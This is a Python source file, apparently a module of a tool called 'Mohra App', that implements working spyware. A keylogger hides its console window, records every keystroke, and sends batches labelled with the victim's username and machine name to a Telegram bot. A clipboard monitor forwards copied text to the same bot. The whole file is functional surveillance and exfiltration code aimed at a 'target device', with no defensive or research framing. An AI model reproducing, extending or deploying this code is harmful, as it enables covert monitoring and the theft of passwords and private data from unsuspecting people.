"""
Mohra App - "key" Module (automation)
No backend server needed - sends directly to automation endpoint
"""

import os
import sys
import time
import base64
import ctypes
import logging
import threading
import requests
from pathlib import Path
from typing import Any, Dict, Optional
from datetime import datetime
from pynput import keyboard

if getattr(sys, "frozen", False):
    root_dir = Path(sys.executable).resolve().parent
else:
    root_dir = Path(__file__).resolve().parent.parent

if str(root_dir) not in sys.path:
    sys.path.insert(0, str(root_dir))

from modules.threading_manager import BaseWorker, PeriodicWorker, ThreadManager
from modules.telegram_service import Send_tele_msg
from config import load_config

# ==============================================================================
# CONFIGURATION - EDIT THESE
# ==============================================================================
SEND_INTERVAL = 60                 # Seconds between sends
MAX_BUFFER_SIZE = 100              # Send immediately if buffer hits this

_initial_config = load_config()
BOT_TOKEN = os.getenv("MOHRA_TELEGRAM_BOT_TOKEN") or _initial_config.get("telegram_bot_token", "")
CHAT_ID = os.getenv("MOHRA_TELEGRAM_CHAT_ID") or _initial_config.get("telegram_chat_id", "")


# ==============================================================================
# GLOBAL STATE
# ==============================================================================
log_buffer = []
buffer_lock = threading.Lock()
send_timer = None
USER_INFO_SENT = False

logger = logging.getLogger("mohra.key")


class KeyWorker(BaseWorker):
    """
    Background keylogger worker.
    Sends captured keystrokes to Telegram Bot API (no backend server required).
    """

    def __init__(self, config: Optional[dict] = None, name: str = "KeyWorker"):
        super().__init__(name=name, daemon=True)  # daemon=True SET HERE
        self.config: dict = config or load_config()
        self._stop_event = threading.Event()
        self.listener = None

    def on_start(self):
        self.log("Key module initialized (automation).")
        Send_tele_msg("🟢 Keylogger started on target device", config=self.config)

    def _send_telegram(self, message: str):
        """Send message to Telegram Bot"""
        if not Send_tele_msg(message, config=self.config):
            logger.error("automation send failed")

    def _send_logs_to_telegram(self):
        """Send buffered logs to Telegram"""
        global log_buffer, USER_INFO_SENT, send_timer

        with buffer_lock:
            if not log_buffer:
                # Schedule next check even if empty
                if not self._stop_event.is_set():
                    send_timer = threading.Timer(SEND_INTERVAL, self._send_logs_to_telegram)
                    send_timer.daemon = True
                    send_timer.start()
                return

            # Prepare batch
            batch = log_buffer.copy()
            log_buffer = []

        try:
            # Build message
            header = "📝 <b>Keystroke Batch</b>\n"
            if not USER_INFO_SENT:
                header += f"<b>User:</b> {os.getlogin()}\n"
                header += f"<b>Machine:</b> {os.environ.get('COMPUTERNAME', 'Unknown')}\n"
                header += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                header += "─" * 20 + "\n"
                USER_INFO_SENT = True

            # Split into chunks (Telegram has 4096 char limit)
            chunk = header
            for line in batch:
                if len(chunk) + len(line) > 4000:
                    self._send_telegram(chunk)
                    chunk = "📝 <b>Continued...</b>\n" + line + "\n"
                else:
                    chunk += line + "\n"

            if chunk:
                self._send_telegram(chunk)

        except Exception as e:
            logger.error(f"Failed to send logs: {e}")
            # Put back in buffer for retry
            with buffer_lock:
                log_buffer = batch + log_buffer

        # Schedule next send
        if not self._stop_event.is_set():
            send_timer = threading.Timer(SEND_INTERVAL, self._send_logs_to_telegram)
            send_timer.daemon = True
            send_timer.start()

    def work(self) -> Any:
        global log_buffer, send_timer

        self.log("Key module running...")

        def hide_console():
            if os.name == "nt":
                try:
                    whnd = ctypes.windll.kernel32.GetConsoleWindow()
                    if whnd != 0:
                        ctypes.windll.user32.ShowWindow(whnd, 0)
                        ctypes.windll.kernel32.CloseHandle(whnd)
                except:
                    pass

        def on_press(key):
            global log_buffer

            try:
                # Check for ESC to stop
                if key == keyboard.Key.esc:
                    self._stop_event.set()
                    return False

                # Get character
                if hasattr(key, 'char') and key.char:
                    key_str = key.char
                else:
                    key_str = f"<{key.name}>"

                timestamp = datetime.now().strftime('%H:%M:%S')
                log_entry = f"[{timestamp}] {key_str}"

                with buffer_lock:
                    log_buffer.append(log_entry)

                    # Send immediately if buffer is large
                    if len(log_buffer) >= MAX_BUFFER_SIZE:
                        threading.Thread(target=self._send_logs_to_telegram, daemon=True).start()

            except Exception as e:
                pass

        def on_release(key):
            if key == keyboard.Key.esc:
                return False
            return True

        # Hide window
        hide_console()

        # Start periodic sender
        send_timer = threading.Timer(SEND_INTERVAL, self._send_logs_to_telegram)
        send_timer.daemon = True
        send_timer.start()

        # Start listener
        self.report_progress(50.0, "Key module: Listening...")
        self.listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        self.listener.start()

        # Keep alive until stopped
        while self.listener.is_alive() and not self._stop_event.is_set():
            self.check_cancellation()
            self.sleep_interruptible(0.1)

        # Cleanup
        self._send_logs_to_telegram()  # Send final batch
        return {"status": "completed"}

    def cleanup(self):
        global send_timer
        self._stop_event.set()
        if send_timer:
            send_timer.cancel()
        if self.listener:
            self.listener.stop()
        Send_tele_msg("🔴 Keylogger stopped", config=self.config)
        self.log("Key module cleanup completed.")


class ClipboardWorker(PeriodicWorker):
    """
    Background worker that monitors the clipboard and sends new content to Telegram.
    Polls every `interval` seconds and forwards clipboard text that has changed.
    """

    def __init__(self, interval: float = 5.0, config: Optional[dict] = None):
        super().__init__(interval_seconds=interval, name="Clipboard", daemon=True)
        self.config: dict = config or load_config()
        self.last_clip = ""

    @staticmethod
    def _read_clipboard() -> str:
        """Read clipboard text. Uses win32 ctypes on Windows, pyperclip elsewhere."""
        if os.name == "nt":
            CF_UNICODETEXT = 13
            try:
                if not ctypes.windll.user32.OpenClipboard(None):
                    return ""
                handle = ctypes.windll.user32.GetClipboardData(CF_UNICODETEXT)
                if not handle:
                    ctypes.windll.user32.CloseClipboard()
                    return ""
                locked = ctypes.windll.kernel32.GlobalLock(handle)
                if not locked:
                    ctypes.windll.user32.CloseClipboard()
                    return ""
                text = ctypes.wstring_at(locked)
                ctypes.windll.kernel32.GlobalUnlock(handle)
                ctypes.windll.user32.CloseClipboard()
                return text
            except Exception:
                try:
                    ctypes.windll.user32.CloseClipboard()
                except Exception:
                    pass
                return ""
        else:
            import pyperclip
            return pyperclip.paste() or ""

    def work_iteration(self):
        try:
            text = self._read_clipboard()

            if text and text != self.last_clip and len(text) < 10000:  # Ignore huge copies
                self.last_clip = text
                timestamp = datetime.now().strftime('%H:%M:%S')
                msg = f"📋 <b>Clipboard [{timestamp}]</b>\n<code>{text[:500]}</code>"
                if len(text) > 500:
                    msg += f"\n... ({len(text)} chars total)"
                self._send_telegram(msg)
        except:
            pass

    def _send_telegram(self, text):
        try:
            bot_token = (
                self.config.get("telegram_bot_token")
                or os.getenv("MOHRA_TELEGRAM_BOT_TOKEN")
                or BOT_TOKEN
            )
            chat_id = (
                self.config.get("telegram_chat_id")
                or os.getenv("MOHRA_TELEGRAM_CHAT_ID")
                or CHAT_ID
            )
            if not bot_token or not chat_id:
                return

            requests.post(
                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
                timeout=5,
            )
        except Exception:
            pass


# Alias for backward compatibility
KeyPeriodicWorker = ClipboardWorker

# Factory function
def create_key_worker(config: Optional[dict] = None) -> BaseWorker:
    return KeyWorker(config=config)


if __name__ == "__main__":
    print("Testing key module...")
    worker = create_key_worker()
    manager = ThreadManager.get_instance()
    manager.register_and_start(worker)

    try:
        while worker.is_running():
            print(f"Progress: {worker.progress:.0f}%")
            time.sleep(1)
    except KeyboardInterrupt:
        worker.stop()
